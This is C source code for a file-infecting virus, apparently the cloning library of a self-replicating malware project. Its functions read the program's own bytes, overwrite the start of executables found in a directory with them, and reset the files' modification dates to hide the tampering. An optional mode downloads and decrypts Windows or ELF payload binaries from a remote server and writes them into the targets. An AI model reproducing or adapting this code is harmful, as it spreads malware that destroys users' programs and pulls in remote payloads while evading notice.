#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "common.h"
#include "os.h"
#include "weakcrypt.h"
#include "clonelib.h"

int64_t getOwnBytes(char** bytes, const char* arg0){	
	//Get name of executable
	char* execname;
	#ifdef _WIN32
		if(strcmp(getFileExtension(arg0),"exe\0") && strcmp(getFileExtension(arg0),"com\0")){
			execname=(char*)malloc(sizeof(char)*(strlen(arg0)+4));
			strcpy(execname,arg0);
			strcat(execname,".exe");
		}else{
			execname=(char*)malloc(sizeof(char)*strlen(arg0));
			strcpy(execname,arg0);
		}
	#else
		execname=(char*)malloc(sizeof(char)*strlen(arg0));
		strcpy(execname,arg0);
	#endif

	
	//Open self
	FILE* self_fp=fopen(execname,"rb");
	
	//Check filesize
	fseek(self_fp,0,SEEK_END);
	int64_t size=ftell(self_fp);
	fseek(self_fp,0,SEEK_SET);
	
	//Get own bytes
	*bytes=(char*)malloc(sizeof(char)*size);
	fread(*bytes,1,size,self_fp);
	
	//Check for marker
	bool c;
	for(int64_t i=0;i<size-strlen(END_MARKER);i++){
		for(int j=0;j<END_MARKER_SIZE;j++)
			c*=(*bytes)[i+j]==END_MARKER[END_MARKER_SIZE-1-j];
		if(c){
			printf("Found marker at %i\n",(int)i);
			size=i+strlen(END_MARKER);
			break;
		}
		c=1;
	}
	
	//Clean up
	fclose(self_fp);
	free(execname);
	
	//Return size of bytes
	return size;
}


bool infectTarget(const char* target, const char* malbytes, const int64_t malsize){
	//Get target modify date
	int64_t tardate=getFileModifiedDate(target);
	
	//Open target for cloning
	FILE* tarfile=fopen(target,"r+b");//must be r+, 'w' will overwrite
	if(tarfile==NULL)return 0;

	//Clone (replace first few bytes)
	printf("Writing bytes\n");
	if(fwrite(malbytes,1,malsize,tarfile)!=(unsigned long)malsize){
		fprintf(stderr,"Error: infectTarget: cloning failed\n");
		return 0;
	}
	fclose(tarfile);
	
	//Reset modify date
	printf("Setting modified date\n");
	setFileModifiedDate(target,tardate);
	
	return 1;
}

bool infectDirectory(const char* path, const char* arg0){
	//Get list of files
	char** ls=walkDir(path);
	
	//Go through files
	for(unsigned int i=0;strcmp(ls[i],"\0");i++){
		
		//Check if possible executable
		if(!strcmp(getFileExtension(ls[i]),"\0") || !strcmp(getFileExtension(ls[i]),"exe\0")){
			
			//Make sure target under 2 GB
			if(getFileSize(ls[i])<=INT32_MAX){
				
				//Check if definite executable
				Executable* exectype=getExecType(ls[i]);
				if(exectype->is_exec){	
					printf("%s",ls[i]);
					if(exectype->is_native ){
						
						//Copy own code
						printf("(native)\n");
						char* bytes;
						infectTarget(ls[i],bytes,getOwnBytes(&bytes,arg0));
						free(bytes);
						
					}else if(CROSS_PLATFORM_ON){
						char* remote_url=(char*)malloc(sizeof(char)*strlen(SERVER_OSIR_HOME XBIN_WIN64));
						if(exectype->is_win){
							//Get windows binary
							printf("(windows)");
							strcpy(remote_url,SERVER_OSIR_HOME XBIN_WIN64);
							
						}else if(exectype->is_elf){
							//Get elf/linux binary
							printf("(elf)");
							strcpy(remote_url,SERVER_OSIR_HOME XBIN_ELF64);
							
						}else{
							printf("Error(clonelib.c) - No platform\n");
							continue;
						}
						
						//Copy code from external binary
						char* bytes;
						int bytes_size=decryptRemoteBytes(&bytes,remote_url);
						if(bytes_size>0)
							printf("%d",infectTarget(ls[i],bytes,bytes_size));
						free(bytes);
						free(remote_url);
					}
					printf("\n");
				}
				//Free memory
				free(exectype);
				free(ls[i]);
			}
		}
	}
	
	free(ls);
	return true;
}